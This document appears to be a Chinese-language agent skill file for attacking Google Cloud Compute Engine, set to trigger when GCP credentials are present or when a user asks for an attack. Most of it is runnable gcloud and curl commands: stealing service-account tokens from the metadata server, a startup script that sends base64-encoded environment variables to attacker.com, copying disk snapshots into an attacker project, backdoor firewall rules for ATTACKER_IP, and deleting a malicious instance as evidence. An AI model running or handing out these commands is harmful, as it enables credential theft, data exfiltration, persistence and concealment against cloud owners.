---
name: gcp-compute-engine-attack
type: attack
category: compute
platform: gcp
severity: high
---

# GCP Compute Engine 攻击技能

## 触发条件

- 有 GCP 凭证
- 目标使用 Compute Engine
- 用户要求"攻击 GCE"

## 前置检查

```bash
# 1. 验证凭证
gcloud auth list

# 2. 列出实例
gcloud compute instances list

# 3. 获取项目信息
gcloud config list project
```

## 攻击方法

### 方法 1: 实例枚举

```bash
# 1. 列出所有实例
gcloud compute instances list

# 2. 获取实例详情
gcloud compute instances describe INSTANCE_NAME --zone=ZONE

# 3. 列出所有区域的实例
gcloud compute instances list --filter="*" --format="csv[name,zone,machineType,status]"

# 4. 获取实例元数据
gcloud compute instances describe INSTANCE_NAME --zone=ZONE \
  --format="json" | jq '.metadata.items[]'
```

### 方法 2: 元数据服务攻击

```bash
# 1. SSH 到实例
gcloud compute ssh INSTANCE_NAME --zone=ZONE

# 2. 在实例内访问元数据服务
curl http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"

# 3. 获取默认 Service Account Token
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  -H "Metadata-Flavor: Google"

# 4. 获取 Service Account Email
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email \
  -H "Metadata-Flavor: Google"

# 5. 获取所有 Scopes
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \
  -H "Metadata-Flavor: Google"
```

### 方法 3: 实例启动脚本利用

```bash
# 1. 获取启动脚本
gcloud compute instances describe INSTANCE_NAME --zone=ZONE \
  --format="json" | jq -r '.metadata.items[] | select(.key=="startup-script").value'

# 2. 如果有写权限，修改启动脚本
gcloud compute instances add-metadata INSTANCE_NAME --zone=ZONE \
  --metadata=startup-script='#!/bin/bash
curl -X POST https://attacker.com/exfil -d "$(env | base64)"
'

# 3. 重启实例应用新脚本
gcloud compute instances reset INSTANCE_NAME --zone=ZONE

# 4. 或停止并启动实例
gcloud compute instances stop INSTANCE_NAME --zone=ZONE
gcloud compute instances start INSTANCE_NAME --zone=ZONE
```

### 方法 4: 磁盘快照攻击

```bash
# 1. 列出所有磁盘
gcloud compute disks list

# 2. 创建快照
gcloud compute disks create-snapshot DISK_NAME --zone=ZONE --snapshot-names=SAPSHOT_NAME

# 3. 从快照创建新磁盘（在攻击者项目中）
gcloud compute disks create ATTACK_DISK --source-snapshot=SNAPSHOT_NAME --zone=ZONE

# 4. 创建临时实例挂载磁盘
gcloud compute instances create ATTACK_INSTANCE --zone=ZONE \
  --disk name=ATTACK_DISK,mode=rw

# 5. SSH 到实例并挂载
gcloud compute ssh ATTACK_INSTANCE --zone=ZONE
sudo mkdir /mnt/stolen
sudo mount /dev/sdb1 /mnt/stolen
ls -la /mnt/stolen
```

### 方法 5: Service Account 滥用

```bash
# 1. 获取实例的 Service Account
gcloud compute instances describe INSTANCE_NAME --zone=ZONE \
  --format="json" | jq -r '.serviceAccounts[].email'

# 2. 获取 Service Account Token
# SSH 到实例并执行
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  -H "Metadata-Flavor: Google" > /tmp/token.json

# 3. 使用 Token 访问 GCP API
export ACCESS_TOKEN=$(jq -r '.access_token' /tmp/token.json)
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://storage.googleapis.com/storage/v1/b

# 4. 检查 SA 权限
gcloud iam service-accounts get-iam-policy SA_EMAIL
```

### 方法 6: 防火墙规则利用

```bash
# 1. 列出防火墙规则
gcloud compute firewall-rules list

# 2. 获取规则详情
gcloud compute firewall-rules describe RULE_NAME

# 3. 创建恶意规则（开放所有端口）
gcloud compute firewall-rules create malicious-rule \
  --allow tcp:1-65535,udp:1-65535,icmp \
  --source-ranges 0.0.0.0/0

# 4. 或创建后门规则（只允许攻击者 IP）
gcloud compute firewall-rules create backdoor-rule \
  --allow tcp:22,tcp:443 \
  --source-ranges ATTACKER_IP/32
```

### 方法 7: 网络和子网利用

```bash
# 1. 列出网络
gcloud compute networks list

# 2. 列出子网
gcloud compute networks subnets list

# 3. 获取子网详情
gcloud compute networks subnets describe SUBNET_NAME --region=REGION

# 4. 扫描同一 VPC 中的其他实例
# SSH 到实例并运行
nmap -sn 10.0.0.0/24
```

### 方法 8: 实例创建和利用

```bash
# 1. 创建恶意实例
gcloud compute instances create malicious-instance \
  --zone=ZONE \
  --machine-type=f1-micro \
  --image-family=debian-11 \
  --image-project=debian-cloud \
  --service-account=SA_EMAIL \
  --scopes=cloud-platform

# 2. SSH 到恶意实例
gcloud compute ssh malicious-instance --zone=ZONE

# 3. 使用 SA Token 访问资源
# 在实例内执行
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  -H "Metadata-Flavor: Google"

# 4. 删除证据
gcloud compute instances delete malicious-instance --zone=ZONE --quiet
```

### 方法 9: 镜像和模板利用

```bash
# 1. 列出自定义镜像
gcloud compute images list --project=PROJECT_ID

# 2. 获取镜像详情
gcloud compute images describe IMAGE_NAME --project=PROJECT_ID

# 3. 创建镜像（从磁盘）
gcloud compute images create malicious-image \
  --source-disk=DISK_NAME \
  --source-disk-zone=ZONE

# 4. 导出镜像到 GCS
gcloud compute images export IMAGE_NAME \
  --destination-uri gs://BUCKET_NAME/image.tar.gz \
  --project=PROJECT_ID

# 5. 下载镜像并分析
gsutil cp gs://BUCKET_NAME/image.tar.gz /tmp/
tar -xzf /tmp/image.tar.gz
```

### 方法 10: IAP 隧道利用

```bash
# 1. 如果启用了 IAP
gcloud compute instances describe INSTANCE_NAME --zone=ZONE \
  --format="json" | jq -r '.metadata.items[] | select(.key=="enable-oslogin").value'

# 2. 创建 IAP 隧道
gcloud compute start-iap-tunnel INSTANCE_NAME 22 \
  --zone=ZONE \
  --project=PROJECT_ID

# 3. 通过 SSH 连接
ssh -i ~/.ssh/google_compute_engine \
  -o ProxyCommand="gcloud compute start-iap-tunnel INSTANCE_NAME %p --zone=ZONE --project=PROJECT_ID" \
  USER@INSTANCE_NAME

# 4. 或使用 IAP 转发
gcloud compute ssh INSTANCE_NAME --zone=ZONE --tunnel-through-iap
```

## 验证成功

```bash
# 成功列出实例
gcloud compute instances list

# 成功获取元数据
gcloud compute instances describe INSTANCE_NAME --zone=ZONE

# 成功 SSH
gcloud compute ssh INSTANCE_NAME --zone=ZONE
```

## 下一步

1. 使用实例凭证访问其他 GCP 服务
2. 通过磁盘快照窃取数据
3. 利用网络配置进行横向移动
4. 通过 Service Account 建立持久化
